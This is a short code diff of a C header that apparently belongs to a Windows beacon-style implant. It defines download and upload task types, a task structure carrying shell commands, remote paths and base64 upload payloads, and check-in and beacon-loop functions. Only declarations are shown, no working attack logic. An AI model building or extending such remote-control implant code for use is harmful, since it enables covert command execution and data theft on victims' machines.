@@ -41,26 +41,27 @@ typedef struct {
 #define TASK_TYPE_DOWNLOAD "download"
 #define TASK_TYPE_UPLOAD   "upload"
 
-/* output buffer capacities */
-#define SHELL_OUT_CAP  (64u  * 1024u)
-#define FILE_OUT_CAP   (10u  * 1024u * 1024u)
+/* initial output buffer — handlers grow it as needed via HeapReAlloc */
+#define OUT_INIT_CAP  (64u * 1024u)     /* 64 KB */
 
 typedef struct {
     char  task_id[64];
     char  type[16];
-    char  args[4096];
-    char *data;
+    char *args;       /* heap — shell cmd / remote path */
+    int   args_len;
+    char *data;       /* heap — base64 upload payload */
     int   data_len;
 } PARSED_TASK;
 
 typedef struct {
     char  task_id[64];
     char  error[512];
-    char *output;
+    char *output;       /* heap-allocated; handlers may grow via HeapReAlloc */
     DWORD output_cap;
     DWORD output_len;
 } TASK_RESULT;
 
+/* ── core functions ─────────────────────────────────────── */
 void         beacon_ctx_init(BEACON_CTX *ctx);
 void         beacon_checkin(BEACON_CTX *ctx);
 DWORD WINAPI beacon_loop(LPVOID lpParam);
